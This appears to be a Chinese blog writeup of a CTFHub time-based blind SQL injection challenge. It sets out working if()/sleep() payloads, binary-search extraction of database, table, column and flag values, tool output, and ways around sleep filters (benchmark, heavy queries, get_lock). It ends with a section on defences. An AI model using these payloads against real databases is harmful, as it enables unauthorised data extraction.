---
layout: post
title: CTFHub - SQL 时间盲注 Writeup
platform: ctfhub
date: 2026-10-21 12:54:00 +0800
categories: CTF
---

CTFHub - SQL 时间盲注 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **SQL 注入** → 时间盲注）
- 题型：Web
- 考点：**时间盲注**、`sleep()` + `if()`、二分查找、**网络抖动下的可靠性**


```text
页面标题：CTFHub 技能学习 | 时间盲注

★ 页面【完全不给你反馈】：
    id=1            → 只回显 SQL 语句，没有任何结果文字
    id=1 and 1=2    → 和上面一模一样
    id=999          → 还是一样

    → 不显示数据、不显示报错、连"成功/失败"都不说
    → 唯一还能传递信息的通道：响应时间

★ 验证 sleep() 可用（实测耗时）：
    id=1                                        → 0.29s
    id=1 and sleep(2)                           → 2.21s   ★ 生效
    id=1 and if(1=1,sleep(2),0)                 → 2.47s   ★ 真
    id=1 and if(1=2,sleep(2),0)                 → 0.20s   ★ 假
    id=1 and if(ascii(substr((select database()),1,1))>64,sleep(2),0)   → 2.36s 真
    id=1 and if(ascii(substr((select database()),1,1))>200,sleep(2),0)  → 0.32s 假

★ 二分法提取结果（sleep=1，共 527 次请求，耗时 437 秒）：

    库名            : sqli                        （4 字符）
    表名            : flag,news                   （9 字符）
    flag 表的字段    : flag                        （4 字符）
    news 表的字段    : id,data                     （7 字符）
    flag 值         : ctfhub{f2b21c2eca82b5a946bc7d64}   （32 字符）

★ 独立验证（用 1.5 秒睡眠）：
    length(...)=32              → 1.72s  真 ✅
    ascii(第1字符)=99  ('c')     → 1.69s  真 ✅
    ascii(第2字符)=116 ('t')     → 1.70s  真 ✅
    ascii(第32字符)=125 ('}')    → 1.68s  真 ✅
    ascii(第1字符)=100 ('d')     → 0.18s  假 ✅（故意写错）

flag         : ctfhub{f2b21c2eca82b5a946bc7d64}
```

二、题目分析

**① 四种 SQL 注入的"信息通道"对比**

| 注入类型 | 页面给什么 | 每次能拿多少 |
|---|---|---|
| UNION 注入 | 查询结果 | 一整批数据 |
| 报错注入 | 报错信息（含数据）| 32 字符 |
| 布尔盲注 | 成功 / 失败（两种状态）| 1 bit |
| **时间盲注** | **什么都不给** | **1 bit（靠时钟）** |

**时间盲注是"最后的退路"**：

```text
没有数据回显 → 用不了 UNION
没有报错回显 → 用不了报错注入
连"成功/失败"都不区分 → 用不了布尔盲注

但是……响应时间还能变 → 那就用时间！
```

**② 核心武器：`if()` + `sleep()`**

```sql
id=1 and if( 条件 , sleep(2) , 0 )
              └─┬─┘   └───┬───┘  └┬┘
            真假命题   真→睡2秒   假→立刻返回
```

**执行逻辑**：

```text
条件为真 → 执行 sleep(2) → 数据库卡住 2 秒 → 响应慢  ★
条件为假 → 执行 0        → 立刻返回        → 响应快
```

**于是你获得了一个"用时钟回答的预言机"**：

```
响应 > 1.5 秒  →  条件为真
响应 < 0.5 秒  →  条件为假
```

**③ `sleep()` 的其他写法（如果被过滤）**

```sql
-- 标准写法
if(1=1, sleep(2), 0)

-- 用 benchmark()（让 CPU 空转）
if(1=1, benchmark(10000000, md5('a')), 0)

-- 用 heavy query（大表笛卡尔积）
if(1=1, (select count(*) from information_schema.columns A, information_schema.columns B), 0)

-- 用 get_lock()（获取锁后等超时）
if(1=1, get_lock('x', 2), 0)
```

**④ 为什么还是用二分法**

```text
时间盲注每次提问都要"真的等"（条件为真时）
→ 每次请求成本很高（1~2 秒）

如果顺序试（从 32 试到 126）：
    平均 64 次 × 1.5 秒 = 96 秒 / 字符
    32 字符的 flag → 51 分钟 ❌

二分法（7 次 / 字符）：
    7 × 1.5 秒 ≈ 10 秒 / 字符
    32 字符 → 5 分钟 ✅

★ 二分法在时间盲注里不是"优化"，是"必须"
```

**⑤ ★ 最大的问题：网络抖动导致误判**

**这题我实际踩到了**：

```text
第一次跑，表名抓出来是 'flag,oews'
                                  └┬┘
                              应该是 'n'，却抓成了 'o'

原因：
    'n' = 110，'o' = 111（差 1）

    二分过程中有一问是 "ascii > 110 ?"
    正确答案是"假"（110 不大于 110），应该很快返回
    但那一次请求刚好遇到网络抖动，耗时超过阈值 → 被判成"真"
    → 范围上移到 111 → 最终取出 'o' ❌
```

**解决：每取完一个字符，用等号再复核一次**

```sql
-- 二分得到 c 之后，问一句：
id=1 and if(ascii(substr((...),pos,1))=c, sleep(1), 0)

-- 如果这次响应快（假）→ 说明刚才取错了 → 重新二分
```

**★ 这是时间盲注最关键的经验**：

```
时间盲注不是"问一次就算数"，必须做【结果校验】
否则一个抖动的网络包就能让你的 flag 少/错一个字符
```

三、解题步骤

**第 1 步：确认页面完全没反馈**

```
ID 框输入：1        → 只有 SQL 语句，没有结果
ID 框输入：1 and 1=2 → 和上面一模一样
ID 框输入：999      → 还是一样
```

**结论**：只能走时间盲注。

**第 2 步：确认 `sleep()` 生效**

```
ID 框输入：1 and sleep(2)
```

**观察**：页面明显卡了 2 秒才出来 ✅

**再测条件控制**：

```
ID 框输入：1 and if(1=1,sleep(2),0)   → 卡 2 秒（真）
ID 框输入：1 and if(1=2,sleep(2),0)   → 立刻出来（假）
```

**第 3 步：测出基线时间**

```
ID 框输入：1        → 记下耗时（本例约 0.2 秒）
```

**为什么要测基线**：

```
判定阈值不能拍脑袋定。
基线 0.2s、睡眠后 1.2s → 阈值取中点 0.7s 最稳

如果阈值定得太低（比如 0.3s），正常请求的抖动会被误判成"真"
```

**第 4 步：问库名长度**

```
ID 框输入：1 and if(length((select database()))>4,sleep(1),0)
→ 慢 → 长度 > 4？不，慢表示"真"...

等等，反过来：
    慢 = 条件为真 = 长度 > 4
    快 = 条件为假 = 长度 ≤ 4
```

**二分过程**（本例）：

```
问 > 4  → 快（假）→ 长度 ≤ 4
问 > 2  → 慢（真）→ 长度 > 2  → 3 或 4
问 > 3  → 慢（真）→ 长度 > 3  → 4

长度 = 4
```

**第 5 步：逐字符问库名（7 次 / 字符）**

```
ID 框输入：
1 and if(ascii(substr((select database()),1,1))>64,sleep(1),0)
```

**按二分表推进**（目标是 `s` = 115）：

| 提问 | 响应 | 推理 | 范围 |
|---|---|---|---|
| `>64` | 慢（真）| 大于 64 | 65~127 |
| `>96` | 慢（真）| 大于 96 | 97~127 |
| `>112` | 慢（真）| 大于 112 | 113~127 |
| `>120` | 快（假）| 不大于 120 | 113~120 |
| `>116` | 快（假）| 不大于 116 | 113~116 |
| `>114` | 慢（真）| 大于 114 | 115~116 |
| `>115` | 快（假）| 不大于 115 | **115 = 's'** |

**★ 每确定一个字符，都补一次等号复核**：

```
1 and if(ascii(substr((select database()),1,1))=115,sleep(1),0)
→ 慢 = 正确 ✅
```

**第 6 步：换查询，继续问**

**壳完全不变，只换中间那块**：

```sql
-- 库名
(select database())

-- 表名
(select group_concat(table_name) from information_schema.tables where table_schema=database())

-- 字段名
(select group_concat(column_name) from information_schema.columns where table_name='flag')

-- flag
(select group_concat(flag) from flag)
```

**第 7 步：用工具跑（32 个字符手工太累）**

```text
双击 sqli-time.bat
→ 粘贴地址 http://challenge-xxx:10800/?id=1
→ sleep 秒数：填 1（默认也行）
→ 是否字符型：N
→ 等 5~8 分钟（别关窗口！）
```

**工具实测输出**：

```text
① 标定基线
  正常请求耗时: 0.21, 0.18, 0.20（平均 0.20s）

② 验证 sleep() 生效
  1 and sleep(1)  -> 1.18s  ★ 生效
  if(1=1,sleep)    -> 1.18s  ★ 真
  if(1=2,sleep)    -> 0.18s  ★ 假
  实际阈值: 0.69s（基线 0.20s，睡眠后 1.18s）

③ 爆库名
  问长度... 4
    [ 1/4] 's'
    [ 4/4] 'sqli'
  ★ 库名 = 'sqli'

④ 爆表名
  问长度... 9
    [ 9/9] 'flag,news'
  ★ 表名 = 'flag,news'

⑤ 爆字段名
  ★ 表 flag 的字段 = 'flag'

⑥ 爆数据，找 flag
    [10/32] 'ctfhub{f2b'
    [20/32] 'ctfhub{f2b21c2eca82b'
    [32/32] 'ctfhub{f2b21c2eca82b5a946bc7d64}'
  ★ flag.flag = 'ctfhub{f2b21c2eca82b5a946bc7d64}'

★ FLAG: ctfhub{f2b21c2eca82b5a946bc7d64}

总请求 527 次，总耗时 437 秒
```

四、延伸知识

**① 四种盲注的速度对比（同样 32 字符的 flag）**

| 方法 | 每次请求耗时 | 需要请求数 | 总耗时 |
|---|---|---|---|
| UNION 注入 | 0.19s | 1 次 | **0.2 秒** |
| 报错注入 | 0.19s | 2~3 次 | **1 秒** |
| 布尔盲注 | 0.19s | ~224 次 | **43 秒** |
| 时间盲注 | 0.6s（平均）| ~527 次 | **437 秒** |

**所以判断顺序一定是**：

```
先试 UNION → 不行再试报错 → 不行再试布尔 → 最后才用时间
★ 能用前面就不用后面
```

**② 时间盲注的优化技巧**

```text
① 二分法（必需）            → 7 次/字符，而不是 95 次
② 减小 sleep 时间            → sleep(0.5) 但要相应调低阈值
③ 一次问多个条件             → 用位运算或 concat 打包
④ 只取关键数据               → 先问长度，别瞎试
⑤ 缩小字符范围               → flag 只在 48~125 之间
⑥ 并发请求                   → 多线程问不同位置（注意别被封）
⑦ 用 "or" 代替 "and"         → 有时能省一半请求
```

**③ 提高可靠性（这题的关键经验）**

```text
★ 每个字符取完必须复核
    if(ascii(substr(...,pos,1))=c, sleep(N), 0)  → 应为真
    如果为假 → 重新二分

★ 阈值要动态算，不要写死
    阈值 = (基线 + 睡眠后) / 2

★ 落在"灰区"的响应要重问
    比基线慢很多、但没到睡眠时间 → 说明网络不稳，重来一次

★ 多次测量取平均（基线至少测 3 次）
```

**④ 如果连 sleep 都被过滤了**

```sql
-- ① benchmark() 让 CPU 空转
if(1=1, benchmark(5000000, md5('a')), 0)

-- ② 大表笛卡尔积（heavy query）
if(1=1, (select count(*) from information_schema.columns A, information_schema.columns B, information_schema.columns C), 0)

-- ③ get_lock() 加锁等超时
if(1=1, get_lock('test', 3), 0)

-- ④ 用正则回溯爆炸（PostgreSQL 等）
```

**这些都不依赖 sleep 关键字，能绕过简单的过滤。**

**⑤ 防护**

```text
· ★ 参数化查询（根本办法）
· 统一响应：无论查询成功失败都返回同一个页面 ——
    这会让布尔盲注失效
· 统一响应时间：这很难做到，但可以限制单次查询的执行时间上限
    （比如 MySQL 的 max_execution_time）
· 禁用危险函数：sleep / benchmark / get_lock
· 限流：盲注需要成百上千次请求，限流能有效阻断
· 最小权限数据库账号
```

五、总结

- **本题核心：页面完全没反馈 → 用 `if(条件, sleep(N), 0)` 让"条件为真"时响应变慢 → 二分法逐字符问出来。**
- 核心 payload 模板：

```sql
-- 问长度
1 and if(length((select database()))>4, sleep(1), 0)

-- 问某字符的 ASCII
1 and if(ascii(substr((select database()),1,1))>64, sleep(1), 0)

-- 复核（重要！）
1 and if(ascii(substr((select database()),1,1))=115, sleep(1), 0)

-- 换成任意查询
1 and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>64, sleep(1), 0)
1 and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),1,1))>64, sleep(1), 0)
1 and if(ascii(substr((select group_concat(flag) from flag),1,1))>64, sleep(1), 0)
```

- **三个必记要点**：

```text
① 慢 = 真，快 = 假（if 的第二个参数是 sleep）
② 二分法不是优化，是必需（95 次 vs 7 次）
③ ★ 每个字符必须复核 —— 网络抖动会让结果差 1，
   我第一次跑就抓出了 'flag,oews'（n→o），复核后修正为 'flag,news'
```
